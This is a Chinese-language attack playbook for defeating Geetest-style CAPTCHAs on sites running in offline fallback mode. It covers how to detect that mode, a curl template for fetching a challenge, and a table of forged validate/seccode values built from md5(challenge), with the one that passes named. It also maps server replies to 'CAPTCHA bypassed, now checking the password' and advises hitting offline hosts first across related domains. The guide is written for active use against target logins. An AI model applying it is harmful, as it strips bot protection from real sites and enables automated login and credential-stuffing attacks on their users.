# 极验类验证码:离线(降级)模式判定与提交矩阵

## 1. 为什么离线模式可算

- **在线模式**:客户端上传 `w` 参数 → 厂商服务器返回 `validate` / `seccode` → 站点拿自己的私钥
  回调厂商做二次校验。凭据由厂商服务器签发,**无法本地构造**。
- **离线(宕机降级)模式**:厂商 SDK 在本地按公开公式生成/校验 ⇒ **客户端可自行构造通过的凭据**。
- 判定入口 = 初始化响应里的 `success` 与 `gt`。`gt` 是厂商 demo 公共值(典型 `md5("123456")`)时
  基本可判离线。

## 2. 初始化请求

```bash
curl -sk 'https://<目标>/<captcha-act>' \
  -H 'Referer: https://<目标>/<登录页>' \
  -H 'X-Requested-With: XMLHttpRequest'
```

典型回包:`{"success":0,"gt":"<32hex>","challenge":"<32hex>","new_captcha":true}`

## 3. 提交矩阵(逐条试,只看下一层业务文案)

必带字段:`<captcha>_challenge` / `<captcha>_validate` / `<captcha>_seccode`

| # | validate | seccode |
|---|---|---|
| 1 | `md5(challenge)` | `md5(challenge)` |
| 2 | `md5(challenge)` | `md5(challenge)` + `"|jordan"` |
| 3 | `md5(challenge)` + `"|jordan"` | 同左 |
| 4 | `md5(challenge + gt)` | 同左 |
| 5 | `md5(gt + challenge)` | 同左 |
| 6 | `md5(gt)` | 同左 |

**只有 validate 放 `md5(challenge)`、不带 `|jordan` 的那条能过。**
`|jordan` 后缀属于 seccode 的固定格式,放进 validate 必失败(其余变体回「验证失败，请重新验证」)。

## 4. 语义对照

| 现象 | 含义 |
|---|---|
| 「验证失败，请重新验证」 | 凭据不被接受(模式判错或公式不对) |
| 「用户名或密码不正确」 | **验证码已过**,已进入凭据校验 |
| 「请重新获取验证码」 | 已过,但验证码/CSRF 已过期 |
| 恒 403 / 恒定报错且回包无 challenge | 缺 Referer,不是「端点不存在」 |

## 5. 排障纪律

- 逐条改**一个**变量(validate 内容 / seccode 内容 / 是否带 `|jordan`),不要成批随机重试。
- 命中后重取 challenge 复验 5 次,避免把偶发通过当结论。
- 同族多域名逐个跑本流程,离线的那台优先打。
